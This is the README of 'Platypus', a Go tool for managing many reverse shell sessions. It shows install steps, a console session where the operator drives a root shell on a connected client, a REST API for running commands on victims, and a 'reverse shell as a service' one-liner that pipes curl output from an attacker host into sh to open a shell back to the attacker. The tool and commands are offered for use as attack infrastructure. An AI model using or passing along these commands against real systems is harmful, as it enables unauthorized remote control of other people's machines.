# Platypus

A modern multiple reverse shell sessions/clients manager via terminal written in go

#### Features
- [x] Multiple service listening port
- [x] Multiple client connections
- [x] RESTful API
- [x] Reverse shell as a service
- [ ] Upgrade common reverse shell session into full interactive session

#### Use Platypus from source code
```
go get github.com/WangYihang/Platypus
cd go/src/github.com/WangYihang/Platypus
go run platypus.go
```

#### Use Platypus from release binaries
```
# Download binary from https://github.com/WangYihang/Platypus/releases
root@kali:~# chmod +x ./Platypus_linux_amd64
root@kali:~# ./Platypus_linux_amd64
>> Help
Usage: 
	Help [COMMANDS]
Commands: 
Command
	execute a command on the current session
DataDispatcher
	DataDispatcher command on all clients which are interactive
Exit
	Exit the whole process
	If there is any listening server, it will ask you to stop them or not
Info
	Display the infomation of a node, using the hash of the node
Interact
	Pop up a interactive session, you can communicate with it via stdin/stdout
Jump
	Jump to a node, waiting to interactive with it
List
	Try list all listening servers and connected clients
REST
	Start a RESTful HTTP Server to manager all clients
Run
	Try to run a server, listening on a port, waiting for client to connect
Switching
	Switch the interactive field of a node, allows you to interactive with it
	If the current status is ON, it will turns to OFF. If OFF, turns ON
>> Run 0.0.0.0 8080
>> 2018/10/24 14:36:39 Server running at: [b62899ae4eb021ae6faa100b0d6f2ae8] 0.0.0.0:8080 (0 online clients) (started at: now)
>> 2018/10/24 14:37:05 New client [d14a421389af9436d7d4181774077dab] tcp://127.0.0.1:54798 (connected at: now) [false] Connected
>> List
2018/10/24 14:37:11 Listing 1 servers
[b62899ae4eb021ae6faa100b0d6f2ae8] 0.0.0.0:8080 (1 online clients) (started at: 31 seconds ago)
	[d14a421389af9436d7d4181774077dab] tcp://127.0.0.1:54798 (connected at: 6 seconds ago) [false]
>> Jump d
2018/10/24 14:37:12 The current interactive shell is set to: [d14a421389af9436d7d4181774077dab] tcp://127.0.0.1:54798 (connected at: 7 seconds ago) [false]
>> Interact
2018/10/24 14:37:14 Interacting with [d14a421389af9436d7d4181774077dab] tcp://127.0.0.1:54798 (connected at: 9 seconds ago) [false]
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
exit
>> REST 127.0.0.1 9090
2018/10/24 14:37:27 RESTful HTTP Server running at 127.0.0.1:9090
```

#### Reverse shell as a Service
```bash
# victim will be redirected to attacker-host attacker-port
sh -c "$(curl http://host:port/attacker-host/attacker-port)"
# if the attacker info not specified, it will use host, port as attacker-host attacker-port
sh -c "$(curl http://host:port/)"
```

#### RESTful API
* `GET /client` List all online clients
```
# curl 'http://127.0.0.1:9090/client'
{
    "msg": [
        "127.0.0.1:54798"
    ],
    "status": true
}
```
* `POST /client/:hash` execute a command on a specific client
```
# curl -X POST 'http://127.0.0.1:9090/client/d14a421389af9436d7d4181774077dab' --data 'cmd=whoami'
{
    "status": true,
    "msg": "root\n",
}
```
* How to hash?
```
# echo -n "127.0.0.1:54798" | md5sum
d14a421389af9436d7d4181774077dab
```

#### TODO
- [ ] More interfaces in RESTful API
- [ ] RESTful API should auth
